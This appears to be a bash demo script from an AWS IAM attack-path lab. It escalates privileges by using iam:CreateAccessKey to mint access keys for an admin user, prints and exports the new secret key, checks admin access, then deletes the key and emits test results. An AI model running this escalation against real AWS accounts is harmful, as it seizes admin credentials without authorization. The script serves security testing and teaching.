#!/bin/bash

# Demo script for dev__user_has_createAccessKey_to_admin attack path
# This script demonstrates how a user with iam:CreateAccessKey permission
# on a specific admin user can escalate privileges by creating access keys

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}=== Dev User Has CreateAccessKey to Admin Attack Demo ===${NC}"
echo "This demo shows how a user with iam:CreateAccessKey permission"
echo "on an admin user can escalate privileges by creating access keys."
echo ""

# Check if AWS CLI is installed
if ! command -v aws &> /dev/null; then
    echo -e "${RED}Error: AWS CLI is not installed or not in PATH${NC}"
    exit 1
fi

# Check if we have AWS credentials configured
if ! aws sts get-caller-identity &> /dev/null; then
    echo -e "${RED}Error: AWS credentials not configured. Please run 'aws configure' first.${NC}"
    exit 1
fi

echo -e "${YELLOW}Step 1: Verifying current identity${NC}"
CURRENT_IDENTITY=$(aws sts get-caller-identity --output json)
echo "Current identity:"
echo "$CURRENT_IDENTITY" | jq '.'
echo ""

# Check if we're running as the Adam user
CURRENT_USER=$(echo "$CURRENT_IDENTITY" | jq -r '.Arn' | cut -d'/' -f2)
if [ "$CURRENT_USER" != "pl-Adam" ]; then
    echo -e "${YELLOW}Note: This demo should be run as the pl-Adam user for full effect${NC}"
    echo "Current user: $CURRENT_USER"
    echo ""
fi

echo -e "${YELLOW}Step 2: Attempting to create access key for pl-dev-admin${NC}"
echo "This demonstrates the privilege escalation attack..."

# Try to create an access key for the dev-admin user
echo "Creating access key for pl-dev-admin user..."
if ACCESS_KEY_RESULT=$(aws iam create-access-key --user-name pl-dev-admin --output json 2>&1); then
    echo -e "${GREEN}✓ SUCCESS: Access key created for pl-dev-admin!${NC}"
    echo ""
    echo "Access Key Details:"
    echo "$ACCESS_KEY_RESULT" | jq '.'
    echo ""
    
    # Extract the access key details
    ACCESS_KEY_ID=$(echo "$ACCESS_KEY_RESULT" | jq -r '.AccessKey.AccessKeyId')
    SECRET_ACCESS_KEY=$(echo "$ACCESS_KEY_RESULT" | jq -r '.AccessKey.SecretAccessKey')
    
    echo -e "${YELLOW}Step 3: Testing the new access key${NC}"
    echo "Testing the newly created access key..."
    
    # Test the new access key by assuming the dev-admin identity
    export AWS_ACCESS_KEY_ID="$ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$SECRET_ACCESS_KEY"
    
    if NEW_IDENTITY=$(aws sts get-caller-identity --output json 2>&1); then
        echo -e "${GREEN}✓ SUCCESS: Successfully assumed dev-admin identity!${NC}"
        echo "New identity:"
        echo "$NEW_IDENTITY" | jq '.'
        echo ""
        
        # Test admin permissions
        echo -e "${YELLOW}Step 4: Testing admin permissions${NC}"
        echo "Testing if we now have admin access..."
        
        if aws iam list-users --output json > /dev/null 2>&1; then
            echo -e "${GREEN}✓ SUCCESS: Can list IAM users (admin permission confirmed)${NC}"
        else
            echo -e "${RED}✗ FAILED: Cannot list IAM users${NC}"
        fi
        
        if aws s3 ls > /dev/null 2>&1; then
            echo -e "${GREEN}✓ SUCCESS: Can list S3 buckets (admin permission confirmed)${NC}"
        else
            echo -e "${RED}✗ FAILED: Cannot list S3 buckets${NC}"
        fi
        
        # Clean up the access key
        echo ""
        echo -e "${YELLOW}Step 5: Cleaning up the access key${NC}"
        echo "Removing the access key to clean up..."
        if aws iam delete-access-key --user-name pl-dev-admin --access-key-id "$ACCESS_KEY_ID" 2>/dev/null; then
            echo -e "${GREEN}✓ Access key cleaned up successfully${NC}"
        else
            echo -e "${YELLOW}⚠ Warning: Could not clean up access key (may need manual cleanup)${NC}"
        fi
        
        # Unset the environment variables
        unset AWS_ACCESS_KEY_ID
        unset AWS_SECRET_ACCESS_KEY
        
        echo ""
        echo -e "${GREEN}=== ATTACK SUCCESSFUL ===${NC}"
        echo "The attack successfully demonstrated privilege escalation:"
        echo "1. Adam user had iam:CreateAccessKey permission on pl-dev-admin"
        echo "2. Created an access key for the admin user"
        echo "3. Used the access key to assume admin privileges"
        echo "4. Confirmed admin access by testing various permissions"
        echo ""
        
        # Output standardized test results
        echo "TEST_RESULT:dev__user_has_createAccessKey_to_admin:SUCCESS"
        echo "TEST_DETAILS:dev__user_has_createAccessKey_to_admin:Successfully created access key for admin user and escalated privileges"
        echo "TEST_METRICS:dev__user_has_createAccessKey_to_admin:access_key_created=true,admin_access_confirmed=true"
        
    else
        echo -e "${RED}✗ FAILED: Could not assume dev-admin identity with new access key${NC}"
        echo "Error: $NEW_IDENTITY"
        echo ""
        echo "TEST_RESULT:dev__user_has_createAccessKey_to_admin:FAILURE"
        echo "TEST_DETAILS:dev__user_has_createAccessKey_to_admin:Failed to assume admin identity with created access key"
        echo "TEST_METRICS:dev__user_has_createAccessKey_to_admin:access_key_created=true,admin_access_failed=true"
        exit 1
    fi
    
else
    echo -e "${RED}✗ FAILED: Could not create access key for pl-dev-admin${NC}"
    echo "Error: $ACCESS_KEY_RESULT"
    echo ""
    echo "This could be because:"
    echo "1. The pl-Adam user doesn't have the required permissions"
    echo "2. The pl-dev-admin user doesn't exist"
    echo "3. There's a policy preventing the action"
    echo ""
    echo "TEST_RESULT:dev__user_has_createAccessKey_to_admin:FAILURE"
    echo "TEST_DETAILS:dev__user_has_createAccessKey_to_admin:Failed to create access key for admin user"
    echo "TEST_METRICS:dev__user_has_createAccessKey_to_admin:access_key_creation_failed=true"
    exit 1
fi
